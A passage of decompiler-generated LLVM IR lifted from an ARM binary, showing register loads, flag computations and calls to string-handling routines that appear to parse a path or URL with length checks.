  store i32 %v1_9a70, i32* %r1.global-to-local, align 4
  %v2_9a74 = inttoptr i32 %v0_9a6c to i8*
  %v3_9a74 = call i32 @function_12504(i8* %v2_9a74, i32 %v1_9a70)
  store i32 %v3_9a74, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9400

dec_label_pc_9a7c:                                ; preds = %dec_label_pc_8dd0
  %v0_9a7c = load i32, i32* @r8, align 4
  %v1_9a7c = add i32 %v0_9a7c, -1456
  %v2_9a7c = inttoptr i32 %v1_9a7c to i32*
  %v3_9a7c = load i32, i32* %v2_9a7c, align 4
  store i32 %v3_9a7c, i32* %r0.global-to-local, align 4
  %v1_9a80 = call i32 @function_12e9c(i32 %v3_9a7c)
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_9a8c = load i32, i32* @r8, align 4
  %v2_9a8c = add i32 %v1_9a8c, -1456
  %v3_9a8c = inttoptr i32 %v2_9a8c to i32*
  store i32 -1, i32* %v3_9a8c, align 4
  %v0_9a90 = load i32, i32* %r3.global-to-local, align 4
  %v1_9a90 = trunc i32 %v0_9a90 to i8
  %v2_9a90 = load i32, i32* @r8, align 4
  %v3_9a90 = add i32 %v2_9a90, -1452
  %v4_9a90 = inttoptr i32 %v3_9a90 to i8*
  store i8 %v1_9a90, i8* %v4_9a90, align 1
  br label %dec_label_pc_8838

dec_label_pc_9a98:                                ; preds = %dec_label_pc_9650
  %v0_9a98 = load i32, i32* @r8, align 4
  %v1_9a98 = add i32 %v0_9a98, -1452
  %v2_9a98 = inttoptr i32 %v1_9a98 to i8*
  %v3_9a98 = load i8, i8* %v2_9a98, align 1
  %v4_9a98 = zext i8 %v3_9a98 to i32
  store i32 %v4_9a98, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_9a9c = icmp eq i8 %v3_9a98, 0
  store i1 %v2_9a9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9a9c, label %dec_label_pc_8838, label %dec_label_pc_9400

dec_label_pc_9aa8:                                ; preds = %dec_label_pc_98c0
  %v0_9aa8 = load i32, i32* @r4, align 4
  store i32 %v0_9aa8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1575c.21 to i32), i32* %r1.global-to-local, align 4
  %v3_9ab0 = inttoptr i32 %v0_9aa8 to i8*
  %v4_9ab0 = call i32 @function_128bc(i8* %v3_9ab0, i32 ptrtoint ([4 x i8]* @global_var_1575c.21 to i32))
  store i32 %v4_9ab0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9ab4 = icmp slt i32 %v4_9ab0, 0
  store i1 %v1_9ab4, i1* %cpsr_n.global-to-local, align 1
  %v2_9ab4 = icmp eq i32 %v4_9ab0, 0
  store i1 %v2_9ab4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9ab4, label %bb240, label %dec_label_pc_98f4

bb240:                                            ; preds = %dec_label_pc_9aa8
  %v0_9abc = load i32, i32* %fp.global-to-local, align 4
  %v1_9abc = load i32, i32* @r5, align 4
  %v2_9abc = sub i32 %v0_9abc, %v1_9abc
  %v3_9abc = icmp uge i32 %v0_9abc, %v1_9abc
  store i1 %v3_9abc, i1* %cpsr_c.global-to-local, align 1
  %v4_9abc = xor i32 %v1_9abc, %v0_9abc
  %v5_9abc = xor i32 %v2_9abc, %v0_9abc
  %v6_9abc = and i32 %v5_9abc, %v4_9abc
  %v7_9abc = icmp slt i32 %v6_9abc, 0
  store i1 %v7_9abc, i1* %cpsr_v.global-to-local, align 1
  %v8_9abc = icmp slt i32 %v2_9abc, 0
  store i1 %v8_9abc, i1* %cpsr_n.global-to-local, align 1
  %v9_9abc = icmp eq i32 %v0_9abc, %v1_9abc
  store i1 %v9_9abc, i1* %cpsr_z.global-to-local, align 1
  %v7_9ac0 = icmp sgt i32 %v0_9abc, %v1_9abc
  %. = select i1 %v7_9ac0, i32 10, i32 1
  store i32 %., i32* %r3.global-to-local, align 4
  %v9_9ac8 = trunc i32 %. to i8
  %v10_9ac8 = load i32, i32* @r8, align 4
  %v11_9ac8 = add i32 %v10_9ac8, -1452
  %v12_9ac8 = inttoptr i32 %v11_9ac8 to i8*
  store i8 %v9_9ac8, i8* %v12_9ac8, align 1
  br label %dec_label_pc_98fc

dec_label_pc_9ad4:                                ; preds = %dec_label_pc_9548
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 36, i32* %r0.global-to-local, align 4
  %v0_9adc = load i32, i32* @r8, align 4
  %v1_9adc = add i32 %v0_9adc, 656
  %v2_9adc = inttoptr i32 %v1_9adc to i32*
  %v3_9adc = load i32, i32* %v2_9adc, align 4
  store i32 %v3_9adc, i32* @r4, align 4
  %v3_9ae0 = call i32 @function_11b24(i32 36, i32* null)
  %v0_9ae4 = load i32, i32* @r4, align 4
  store i32 %v0_9ae4, i32* %r1.global-to-local, align 4
  store i32 %v3_9ae0, i32* %r2.global-to-local, align 4
  store i32 11, i32* %r3.global-to-local, align 4
  %v0_9af0 = load i32, i32* @r7, align 4
  store i32 %v0_9af0, i32* %r0.global-to-local, align 4
  %v4_9af4 = call i32 @function_125a0(i32 %v0_9af0, i32 %v0_9ae4, i32 %v3_9ae0, i32 11)
  store i32 %v4_9af4, i32* %r0.global-to-local, align 4
  %v0_9af8 = load i32, i32* @r8, align 4
  %v1_9af8 = add i32 %v0_9af8, 656
  %v2_9af8 = inttoptr i32 %v1_9af8 to i32*
  %v3_9af8 = load i32, i32* %v2_9af8, align 4
  %v0_9afc = load i32, i32* @r7, align 4
  %v2_9afc = add i32 %v0_9afc, %v4_9af4
  store i32 %v2_9afc, i32* @r5, align 4
  store i32 %v4_9af4, i32* @r4, align 4
  %v2_9b04 = sub i32 %v3_9af8, %v4_9af4
  store i32 %v2_9b04, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15798.51 to i32), i32* %r2.global-to-local, align 4
  %v0_9b0c = load i32, i32* @sl, align 4
  store i32 %v0_9b0c, i32* %r3.global-to-local, align 4
  store i32 %v2_9afc, i32* %r0.global-to-local, align 4
  %v4_9b14 = call i32 @function_125a0(i32 %v2_9afc, i32 %v2_9b04, i32 ptrtoint (i32* @global_var_15798.51 to i32), i32 %v0_9b0c)
  store i32 %v4_9b14, i32* %r0.global-to-local, align 4
  %v0_9b18 = load i32, i32* @r8, align 4
  %v1_9b18 = add i32 %v0_9b18, 12
  %v2_9b18 = inttoptr i32 %v1_9b18 to i32*
  %v3_9b18 = load i32, i32* %v2_9b18, align 4
  store i32 %v3_9b18, i32* %r3.global-to-local, align 4
  %v0_9b1c = load i32, i32* @r4, align 4
  %v2_9b1c = add i32 %v0_9b1c, %v4_9b14
  store i32 %v2_9b1c, i32* %r6.global-to-local, align 4
  %v1_9b20 = load i32, i32* %sb.global-to-local, align 4
  %v2_9b20 = add i32 %v1_9b20, %v2_9b1c
  store i32 %v2_9b20, i32* %r2.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v1_9b28 = add i32 %v3_9b18, -4
  %v2_9b28 = icmp ugt i32 %v3_9b18, 3
  store i1 %v2_9b28, i1* %cpsr_c.global-to-local, align 1
  %v3_9b28 = sub i32 3, %v3_9b18
  %v4_9b28 = and i32 %v3_9b28, %v3_9b18
  %v5_9b28 = icmp slt i32 %v4_9b28, 0
  store i1 %v5_9b28, i1* %cpsr_v.global-to-local, align 1
  %v6_9b28 = icmp slt i32 %v1_9b28, 0
  store i1 %v6_9b28, i1* %cpsr_n.global-to-local, align 1
  %v7_9b28 = icmp eq i32 %v3_9b18, 4
  store i1 %v7_9b28, i1* %cpsr_z.global-to-local, align 1
  %v3_9b2c = add i32 %v2_9b20, 2115
  %v4_9b2c = inttoptr i32 %v3_9b2c to i8*
  store i8 0, i8* %v4_9b2c, align 1
  %v7_9b30 = icmp sgt i32 %v3_9b18, 4
  br i1 %v7_9b30, label %dec_label_pc_9b34, label %dec_label_pc_9bbc

dec_label_pc_9b34:                                ; preds = %dec_label_pc_9ad4, %dec_label_pc_9bbc, %dec_label_pc_9bcc
  store i32 -1, i32* %r6.global-to-local, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_9b3c = load i32, i32* @r8, align 4
  %v2_9b3c = add i32 %v1_9b3c, 8
  %v3_9b3c = inttoptr i32 %v2_9b3c to i32*
  store i32 -1, i32* %v3_9b3c, align 4
  %v0_9b40 = load i32, i32* %r3.global-to-local, align 4
  %v1_9b40 = trunc i32 %v0_9b40 to i8
  %v2_9b40 = load i32, i32* @r8, align 4
  %v3_9b40 = add i32 %v2_9b40, -1452
  %v4_9b40 = inttoptr i32 %v3_9b40 to i8*
  store i8 %v1_9b40, i8* %v4_9b40, align 1
  br label %dec_label_pc_8838

dec_label_pc_9b48:                                ; preds = %dec_label_pc_99c0, %bb236
  %v2_9b4c = phi i32 [ %v1_99b0, %bb236 ], [ %v2_99d4, %dec_label_pc_99c0 ]
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_9b4c = inttoptr i32 %v2_9b4c to i8*
  store i8 0, i8* %v3_9b4c, align 1
  br label %dec_label_pc_99e8

dec_label_pc_9b54:                                ; preds = %dec_label_pc_93f0
  %v0_9b54 = load i32, i32* %sb.global-to-local, align 4
  %v1_9b58 = add i32 %v0_9b54, 533
  store i32 %v1_9b58, i32* @r4, align 4
  store i32 %v1_9b58, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9b64 = call i32 @function_1257c(i32 %v1_9b58, i32 255)
  store i32 %v10_82f0, i32* %lr.global-to-local, align 4
  %v3_9b6c = load i32, i32* %stack_var_-40, align 4
  %v0_9b70 = load i32, i32* @r5, align 4
  %v2_9b70 = add i32 %v3_9b6c, 1
  %v1_9b74 = add i32 %v2_9b70, %v0_9b70
  store i32 %v1_9b74, i32* %r0.global-to-local, align 4
  %v1_9b78 = inttoptr i32 %v1_9b74 to i8*
  %v2_9b78 = call i32 @function_124dc(i8* %v1_9b78)
  store i32 %v2_9b78, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9b7c = icmp slt i32 %v2_9b78, 0
  store i1 %v1_9b7c, i1* %cpsr_n.global-to-local, align 1
  %v2_9b7c = icmp eq i32 %v2_9b78, 0
  store i1 %v2_9b7c, i1* %cpsr_z.global-to-local, align 1
  %tmp241 = icmp slt i32 %v2_9b78, 1
  br i1 %tmp241, label %dec_label_pc_9400, label %dec_label_pc_9b84

dec_label_pc_9b84:                                ; preds = %dec_label_pc_9b54
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_9b88 = load i32, i32* %stack_var_-40, align 4
  %v0_9b8c = load i32, i32* @r5, align 4
  %v2_9b8c = add i32 %v3_9b88, 1
  %v1_9b90 = add i32 %v2_9b8c, %v0_9b8c
  store i32 %v1_9b90, i32* %r0.global-to-local, align 4
  %v1_9b94 = inttoptr i32 %v1_9b90 to i8*
  %v2_9b94 = call i32 @function_124dc(i8* %v1_9b94)
  store i32 %v2_9b94, i32* %r0.global-to-local, align 4
  %v1_9b98 = add i32 %v2_9b94, -255
  %v2_9b98 = icmp ugt i32 %v2_9b94, 254
  store i1 %v2_9b98, i1* %cpsr_c.global-to-local, align 1
  %v3_9b98 = sub i32 254, %v2_9b94
  %v4_9b98 = and i32 %v3_9b98, %v2_9b94
  %v5_9b98 = icmp slt i32 %v4_9b98, 0
  store i1 %v5_9b98, i1* %cpsr_v.global-to-local, align 1
  %v6_9b98 = icmp slt i32 %v1_9b98, 0
  store i1 %v6_9b98, i1* %cpsr_n.global-to-local, align 1
  %v7_9b98 = icmp eq i32 %v2_9b94, 255
  store i1 %v7_9b98, i1* %cpsr_z.global-to-local, align 1
  %v8_9b9c = icmp sgt i32 %v2_9b94, 255
  br i1 %v8_9b9c, label %dec_label_pc_9400, label %dec_label_pc_9ba0

dec_label_pc_9ba0:                                ; preds = %dec_label_pc_9b84
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v3_9ba4 = load i32, i32* %stack_var_-40, align 4
  %v0_9ba8 = load i32, i32* @r5, align 4
  %v0_9bac = load i32, i32* @r4, align 4
  store i32 %v0_9bac, i32* @r0, align 4
  %v2_9ba8 = add i32 %v3_9ba4, 1
  %v1_9bb0 = add i32 %v2_9ba8, %v0_9ba8
  store i32 %v1_9bb0, i32* %r1.global-to-local, align 4
  %v2_9bb4 = inttoptr i32 %v0_9bac to i8*
  %v3_9bb4 = call i32 @function_12504(i8* %v2_9bb4, i32 %v1_9bb0)
  store i32 %v3_9bb4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9400

dec_label_pc_9bbc:                                ; preds = %dec_label_pc_9ad4
  %v0_9bbc = load i32, i32* @r5, align 4
  store i32 %v0_9bbc, i32* %r0.global-to-local, align 4
  %v1_9bc0 = inttoptr i32 %v0_9bbc to i8*
  %v2_9bc0 = call i32 @function_124dc(i8* %v1_9bc0)
  store i32 %v2_9bc0, i32* %r0.global-to-local, align 4
  %v1_9bc4 = add i32 %v2_9bc0, -127
  %v2_9bc4 = icmp ugt i32 %v2_9bc0, 126
  store i1 %v2_9bc4, i1* %cpsr_c.global-to-local, align 1
  %v3_9bc4 = sub i32 126, %v2_9bc0
  %v4_9bc4 = and i32 %v3_9bc4, %v2_9bc0
  %v5_9bc4 = icmp slt i32 %v4_9bc4, 0
  store i1 %v5_9bc4, i1* %cpsr_v.global-to-local, align 1
  %v6_9bc4 = icmp slt i32 %v1_9bc4, 0
  store i1 %v6_9bc4, i1* %cpsr_n.global-to-local, align 1
  %v7_9bc4 = icmp eq i32 %v2_9bc0, 127
  store i1 %v7_9bc4, i1* %cpsr_z.global-to-local, align 1
  %v8_9bc8 = icmp sgt i32 %v2_9bc0, 127
  br i1 %v8_9bc8, label %dec_label_pc_9b34, label %dec_label_pc_9bcc

dec_label_pc_9bcc:                                ; preds = %dec_label_pc_9bbc
  %v0_9bcc = load i32, i32* @r8, align 4
  %v1_9bcc = add i32 %v0_9bcc, 12
  %v2_9bcc = inttoptr i32 %v1_9bcc to i32*
  %v3_9bcc = load i32, i32* %v2_9bcc, align 4
  store i32 %v1_9410, i32* %r2.global-to-local, align 4
  %v1_9bd4 = and i32 %v3_9bcc, 33554432
  %v2_9bd4 = icmp ne i32 %v1_9bd4, 0
  store i1 %v2_9bd4, i1* %cpsr_c.global-to-local, align 1
  %v3_9bd4 = mul i32 %v3_9bcc, 128
  %v0_9bd8 = load i32, i32* @r5, align 4
  store i32 %v0_9bd8, i32* %r1.global-to-local, align 4
  %v2_9bdc = add i32 %v3_9bd4, %v1_9410
  store i32 %v2_9bdc, i32* @r0, align 4
  %v2_9be0 = inttoptr i32 %v2_9bdc to i8*
  %v3_9be0 = call i32 @function_12504(i8* %v2_9be0, i32 %v0_9bd8)
  store i32 %v3_9be0, i32* %r0.global-to-local, align 4
  %v0_9be4 = load i32, i32* @r8, align 4
  %v1_9be4 = add i32 %v0_9be4, 12
  %v2_9be4 = inttoptr i32 %v1_9be4 to i32*
  %v3_9be4 = load i32, i32* %v2_9be4, align 4
  store i32 %v1_9410, i32* %r3.global-to-local, align 4
  %v1_9bec = and i32 %v3_9be4, 33554432
  %v2_9bec = icmp ne i32 %v1_9bec, 0
  store i1 %v2_9bec, i1* %cpsr_c.global-to-local, align 1
  %v3_9bec = mul i32 %v3_9be4, 128
  %v2_9bf0 = add i32 %v3_9bec, %v1_9410
  store i32 %v2_9bf0, i32* %r4.global-to-local, align 4
  store i32 %v2_9bf0, i32* %r0.global-to-local, align 4
  %v1_9bf8 = inttoptr i32 %v2_9bf0 to i8*
  %v2_9bf8 = call i32 @function_124dc(i8* %v1_9bf8)
  store i32 ptrtoint (i32* @global_var_1579c.53 to i32), i32* %r1.global-to-local, align 4
  %v2_9c00 = add i32 %v2_9bf0, %v2_9bf8
  store i32 %v2_9c00, i32* @r0, align 4
  %v2_9c04 = inttoptr i32 %v2_9c00 to i8*
  %v3_9c04 = call i32 @function_12504(i8* %v2_9c04, i32 ptrtoint (i32* @global_var_1579c.53 to i32))
  store i32 %v3_9c04, i32* %r0.global-to-local, align 4
  %v0_9c08 = load i32, i32* %r6.global-to-local, align 4
  %v1_9c08 = add i32 %v0_9c08, 3
  store i32 %v1_9c08, i32* @r4, align 4
  %v0_9c0c = load i32, i32* @r8, align 4
  %v1_9c0c = add i32 %v0_9c0c, 656
  %v2_9c0c = inttoptr i32 %v1_9c0c to i32*
  %v3_9c0c = load i32, i32* %v2_9c0c, align 4
  %v0_9c10 = load i32, i32* @r7, align 4
  %v2_9c10 = add i32 %v0_9c10, %v1_9c08
  store i32 %v2_9c10, i32* %r6.global-to-local, align 4
  %v2_9c14 = sub i32 %v3_9c0c, %v1_9c08
  store i32 %v2_9c14, i32* %r1.global-to-local, align 4
  %v0_9c18 = load i32, i32* @sl, align 4
  store i32 %v0_9c18, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15798.51 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9c10, i32* %r0.global-to-local, align 4
  %v4_9c24 = call i32 @function_125a0(i32 %v2_9c10, i32 %v2_9c14, i32 ptrtoint (i32* @global_var_15798.51 to i32), i32 %v0_9c18)
  store i32 %v4_9c24, i32* %r0.global-to-local, align 4
  %v0_9c28 = load i32, i32* @r8, align 4
  %v1_9c28 = add i32 %v0_9c28, 12
  %v2_9c28 = inttoptr i32 %v1_9c28 to i32*
  %v3_9c28 = load i32, i32* %v2_9c28, align 4
  store i32 %v1_9410, i32* %ip.global-to-local, align 4
  %v1_9c30 = and i32 %v3_9c28, 33554432
  %v2_9c30 = icmp ne i32 %v1_9c30, 0
  store i1 %v2_9c30, i1* %cpsr_c.global-to-local, align 1
  %v3_9c30 = mul i32 %v3_9c28, 128
  %v0_9c34 = load i32, i32* @r4, align 4
  %v1_9c34 = load i32, i32* %sb.global-to-local, align 4
  %v2_9c38 = add i32 %v3_9c30, %v1_9410
  store i32 %v2_9c38, i32* @r5, align 4
  %v2_9c34 = add i32 %v0_9c34, %v4_9c24
  %v2_9c3c = add i32 %v2_9c34, %v1_9c34
  store i32 %v2_9c3c, i32* @r4, align 4
  %v0_9c40 = load i32, i32* %fp.global-to-local, align 4
  %v1_9c40 = trunc i32 %v0_9c40 to i8
  %v3_9c40 = add i32 %v2_9c3c, 2115
  %v4_9c40 = inttoptr i32 %v3_9c40 to i8*
  store i8 %v1_9c40, i8* %v4_9c40, align 1
  %v0_9c44 = load i32, i32* @r5, align 4
  store i32 %v0_9c44, i32* %r0.global-to-local, align 4
  %v1_9c48 = inttoptr i32 %v0_9c44 to i8*
  %v2_9c48 = call i32 @function_124dc(i8* %v1_9c48)
  %v0_9c4c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_9c4c, i32* %r1.global-to-local, align 4
  %v0_9c50 = load i32, i32* @r5, align 4
  %v2_9c50 = add i32 %v0_9c50, %v2_9c48
  store i32 %v2_9c50, i32* @r0, align 4
  %v2_9c54 = inttoptr i32 %v2_9c50 to i8*
  %v3_9c54 = call i32 @function_12504(i8* %v2_9c54, i32 %v0_9c4c)
  store i32 %v3_9c54, i32* %r0.global-to-local, align 4
  %v0_9c58 = load i32, i32* @r8, align 4
  %v1_9c58 = add i32 %v0_9c58, 12
  %v2_9c58 = inttoptr i32 %v1_9c58 to i32*
  %v3_9c58 = load i32, i32* %v2_9c58, align 4
  %v1_9c5c = add i32 %v3_9c58, 1
  store i32 %v1_9c5c, i32* %r3.global-to-local, align 4
  store i32 %v1_9c5c, i32* %v2_9c58, align 4
  br label %dec_label_pc_9b34

dec_label_pc_9c68:                                ; preds = %dec_label_pc_984c
  store i32 7, i32* %ip.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  store i32 7, i32* %stack_var_-40, align 4
  %v0_9c74 = load i32, i32* @r5, align 4
  %v1_9c74 = add i32 %v0_9c74, 4
  %v2_9c74 = inttoptr i32 %v1_9c74 to i8*
  %v3_9c74 = load i8, i8* %v2_9c74, align 1
  %v4_9c74 = zext i8 %v3_9c74 to i32
  store i32 %v4_9c74, i32* %r3.global-to-local, align 4
  %v2_9c78 = icmp ugt i8 %v3_9c74, 114
  store i1 %v2_9c78, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9c78 = icmp ult i8 %v3_9c74, 115
  store i1 %v6_9c78, i1* %cpsr_n.global-to-local, align 1
  %v7_9c78 = icmp eq i8 %v3_9c74, 115
  store i1 %v7_9c78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9c78, label %bb242, label %.thread69

bb242:                                            ; preds = %dec_label_pc_9c68
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 8, i32* %stack_var_-40, align 4
  br label %.thread69

.thread69:                                        ; preds = %dec_label_pc_9c68, %bb242
  %v3_9c88 = phi i32 [ 7, %dec_label_pc_9c68 ], [ 8, %bb242 ]
  %v0_9c8c = load i32, i32* @r7, align 4
  %v1_9c8c = sub nsw i32 1, %v3_9c88
  %v2_9c90 = add i32 %v1_9c8c, %v0_9c8c
  store i32 %v2_9c90, i32* @r2, align 4
  store i32 %v0_9c74, i32* @r0, align 4
  %v2_9c98 = add i32 %v3_9c88, %v0_9c74
  store i32 %v2_9c98, i32* @r1, align 4
  %v3_9c9c = call i32 @function_134c0(i32 %v0_9c74, i32 %v2_9c98, i32 %v2_9c90)
  store i32 %v3_9c9c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v0_9cac = load i32, i32* @r6, align 4
  %v1_9cac = load i32, i32* @r4, align 4
  %v2_9cac = add i32 %v1_9cac, %v0_9cac
  %v3_9cac = inttoptr i32 %v2_9cac to i8*
  %v4_9cac = load i8, i8* %v3_9cac, align 1
  %v6_9cac = zext i8 %v4_9cac to i32
  store i32 %v6_9cac, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v9_9cb0 = icmp eq i8 %v4_9cac, 0
  store i1 %v9_9cb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9cb0, label %dec_label_pc_9cf0, label %dec_label_pc_9cb8

dec_label_pc_9cb8:                                ; preds = %.thread69
  %v2_9cb8 = icmp ugt i8 %v4_9cac, 46
  store i1 %v2_9cb8, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9cb8 = icmp ult i8 %v4_9cac, 47
  store i1 %v6_9cb8, i1* %cpsr_n.global-to-local, align 1
  %v7_9cb8 = icmp eq i8 %v4_9cac, 47
  store i1 %v7_9cb8, i1* %cpsr_z.global-to-local, align 1
  %v1_9cbc = load i32, i32* @r5, align 4
  br i1 %v7_9cb8, label %bb243, label %dec_label_pc_9cc4

bb243:                                            ; preds = %dec_label_pc_9cb8
  store i32 %v1_9cbc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9dd4

dec_label_pc_9cc4:                                ; preds = %dec_label_pc_9cb8
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9cd4

dec_label_pc_9ccc:                                ; preds = %dec_label_pc_9cd4
  %v2_9ccc = icmp ugt i8 %v4_9cdc, 46
  store i1 %v2_9ccc, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9ccc = icmp ult i8 %v4_9cdc, 47
  store i1 %v6_9ccc, i1* %cpsr_n.global-to-local, align 1
  %v7_9ccc = icmp eq i8 %v4_9cdc, 47
  store i1 %v7_9ccc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9ccc, label %dec_label_pc_9dd4, label %dec_label_pc_9cd4

dec_label_pc_9cd4:                                ; preds = %dec_label_pc_9ccc, %dec_label_pc_9cc4
  %v1_9ce4 = phi i32 [ %v1_9ce8, %dec_label_pc_9ccc ], [ 1, %dec_label_pc_9cc4 ]
  store i32 %v10_82f0, i32* @lr, align 4
  store i32 %v1_9ce4, i32* %stack_var_-40, align 4
  %v2_9cdc = add i32 %v1_9ce4, %v1_9cbc
  %v3_9cdc = inttoptr i32 %v2_9cdc to i8*
  %v4_9cdc = load i8, i8* %v3_9cdc, align 1
  %v6_9cdc = zext i8 %v4_9cdc to i32
  store i32 %v6_9cdc, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_9ce0 = icmp eq i8 %v4_9cdc, 0
  store i1 %v2_9ce0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_9cdc, i32* %r1.global-to-local, align 4
  %v1_9ce8 = add i32 %v1_9ce4, 1
  store i32 %v1_9ce8, i32* %r3.global-to-local, align 4
  br i1 %v2_9ce0, label %dec_label_pc_9cf0, label %dec_label_pc_9ccc

dec_label_pc_9cf0:                                ; preds = %dec_label_pc_9cd4, %.thread69, %dec_label_pc_9dd4
  %v0_9cf0 = load i32, i32* @r5, align 4
  store i32 %v0_9cf0, i32* %r0.global-to-local, align 4
  %v1_9cf4 = inttoptr i32 %v0_9cf0 to i8*
  %v2_9cf4 = call i32 @function_124dc(i8* %v1_9cf4)
  store i32 %v2_9cf4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9cf8 = icmp slt i32 %v2_9cf4, 0
  store i1 %v1_9cf8, i1* %cpsr_n.global-to-local, align 1
  %v2_9cf8 = icmp eq i32 %v2_9cf4, 0
  store i1 %v2_9cf8, i1* %cpsr_z.global-to-local, align 1
  %tmp244 = icmp slt i32 %v2_9cf4, 1
  br i1 %tmp244, label %dec_label_pc_9d1c, label %dec_label_pc_9d00

dec_label_pc_9d00:                                ; preds = %dec_label_pc_9cf0
  %v0_9d00 = load i32, i32* @r5, align 4
  store i32 %v0_9d00, i32* %r0.global-to-local, align 4
  %v1_9d04 = inttoptr i32 %v0_9d00 to i8*
  %v2_9d04 = call i32 @function_124dc(i8* %v1_9d04)
  store i32 %v2_9d04, i32* %r0.global-to-local, align 4
  %v1_9d08 = add i32 %v2_9d04, -127
  %v2_9d08 = icmp ugt i32 %v2_9d04, 126
  store i1 %v2_9d08, i1* %cpsr_c.global-to-local, align 1
  %v3_9d08 = sub i32 126, %v2_9d04
  %v4_9d08 = and i32 %v3_9d08, %v2_9d04
  %v5_9d08 = icmp slt i32 %v4_9d08, 0
  store i1 %v5_9d08, i1* %cpsr_v.global-to-local, align 1
  %v6_9d08 = icmp slt i32 %v1_9d08, 0
  store i1 %v6_9d08, i1* %cpsr_n.global-to-local, align 1
  %v7_9d08 = icmp eq i32 %v2_9d04, 127
  store i1 %v7_9d08, i1* %cpsr_z.global-to-local, align 1
  %v7_9d0c = icmp sgt i32 %v2_9d04, 127
  br i1 %v7_9d0c, label %.thread72, label %bb245

bb245:                                            ; preds = %dec_label_pc_9d00
  %v8_9d0c = load i32, i32* %sb.global-to-local, align 4
  %v9_9d10 = add i32 %v8_9d0c, 789
  store i32 %v9_9d10, i32* %r0.global-to-local, align 4
  %v8_9d14 = load i32, i32* @r5, align 4
  store i32 %v8_9d14, i32* %r1.global-to-local, align 4
  br label %.thread72

.thread72:                                        ; preds = %dec_label_pc_9d00, %bb245
  store i32 40220, i32* @lr, align 4
  %v3_9d18 = xor i1 %v6_9d08, %v5_9d08
  %v4_9d18 = or i1 %v7_9d08, %v3_9d18
  call void @__pseudo_cond_branch(i1 %v4_9d18, i32 ptrtoint (i32* @global_var_12504.49 to i32))
  br label %dec_label_pc_9d1c

dec_label_pc_9d1c:                                ; preds = %dec_label_pc_9cf0, %.thread72
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_9d20 = load i32, i32* %stack_var_-40, align 4
  %v0_9d24 = load i32, i32* @r5, align 4
  %v2_9d24 = add i32 %v3_9d20, 1
  %v1_9d28 = add i32 %v2_9d24, %v0_9d24
  store i32 %v1_9d28, i32* %r0.global-to-local, align 4
  %v1_9d2c = inttoptr i32 %v1_9d28 to i8*
  %v2_9d2c = call i32 @function_124dc(i8* %v1_9d2c)
  store i32 %v2_9d2c, i32* %r0.global-to-local, align 4
  %v1_9d30 = add i32 %v2_9d2c, -255
  %v2_9d30 = icmp ugt i32 %v2_9d2c, 254
  store i1 %v2_9d30, i1* %cpsr_c.global-to-local, align 1
  %v3_9d30 = sub i32 254, %v2_9d2c
  %v4_9d30 = and i32 %v3_9d30, %v2_9d2c
  %v5_9d30 = icmp slt i32 %v4_9d30, 0
  store i1 %v5_9d30, i1* %cpsr_v.global-to-local, align 1
  %v6_9d30 = icmp slt i32 %v1_9d30, 0
  store i1 %v6_9d30, i1* %cpsr_n.global-to-local, align 1
  %v7_9d30 = icmp eq i32 %v2_9d2c, 255
  store i1 %v7_9d30, i1* %cpsr_z.global-to-local, align 1
  %v8_9d34 = icmp sgt i32 %v2_9d2c, 255
  br i1 %v8_9d34, label %dec_label_pc_9884, label %dec_label_pc_9d38

dec_label_pc_9d38:                                ; preds = %dec_label_pc_9d1c
  %v0_9d38 = load i32, i32* %sb.global-to-local, align 4
